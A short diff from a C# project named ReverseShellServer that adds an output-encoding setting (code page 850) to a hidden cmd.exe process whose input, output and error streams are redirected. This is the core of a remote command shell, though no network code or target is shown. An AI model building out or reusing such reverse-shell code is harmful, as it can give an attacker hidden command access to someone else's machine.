@@ -69,7 +69,8 @@ namespace ReverseShellServer
                         FileName = "cmd.exe",
                         CreateNoWindow = true,
                         UseShellExecute = false,
-                        RedirectStandardOutput = true,
+                        StandardOutputEncoding = Encoding.GetEncoding(850),
+                RedirectStandardOutput = true,
                         RedirectStandardInput = true,
                         RedirectStandardError = true
                     }
